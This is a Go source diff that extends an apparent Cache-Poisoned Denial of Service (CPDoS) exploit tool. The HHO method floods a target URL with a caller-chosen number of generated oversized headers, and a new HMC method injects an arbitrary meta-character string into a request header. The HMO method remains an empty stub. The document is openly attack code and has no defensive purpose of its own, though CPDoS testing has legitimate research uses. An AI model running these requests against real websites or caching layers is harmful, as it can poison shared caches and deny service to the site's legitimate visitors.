@@ -1,7 +1,7 @@
 package internal
 
 import (
-	"strconv"
+	"fmt"
 
 	"github.com/naiba/com"
 	"github.com/parnurzeal/gorequest"
@@ -32,13 +32,26 @@ func (ce *CPDoSExp) Get() (string, int) {
 }
 
 // HHO HTTP Header Oversize
-func (ce *CPDoSExp) HHO(num int) (string, int) {
+func (ce *CPDoSExp) HHO(num int64) (string, int) {
 	ce.preClear(ce.req.Get(ce.URL))
-	for i := 0; i < num; i++ {
-		iStr := strconv.Itoa(i)
-		ce.req.Header.Set("X-CPDoS-Header-"+iStr, "Session-Value-"+com.MD5(iStr))
+	var i int64
+	for i = 0; i < num; i++ {
+		iStr := fmt.Sprintf("%d", i)
+		ce.req.Header.Set("X-SESSION-CPDoS-"+iStr, "Session-"+com.MD5(iStr))
 	}
 	return ce.formatResp(ce.req.End())
+}
+
+// HMC HTTP Meta Character
+func (ce *CPDoSExp) HMC(str string) (string, int) {
+	ce.preClear(ce.req.Get(ce.URL))
+	ce.req.Header.Set("X-REQUEST-CPDoS", str)
+	return ce.formatResp(ce.req.End())
+}
+
+// HMO HTTP Method Override
+func (ce *CPDoSExp) HMO() (string, int) {
+	return "", 0
 }
 
 func (ce *CPDoSExp) formatResp(resp gorequest.Response, body string, errs []error) (string, int) {
@@ -46,14 +59,4 @@ func (ce *CPDoSExp) formatResp(resp gorequest.Response, body string, errs []erro
 		return errs[0].Error(), 0
 	}
 	return body, resp.StatusCode
-}
-
-// HMC HTTP Meta Character
-func (ce *CPDoSExp) HMC() {
-
-}
-
-// HMO HTTP Method Override
-func (ce *CPDoSExp) HMO() {
-
 }
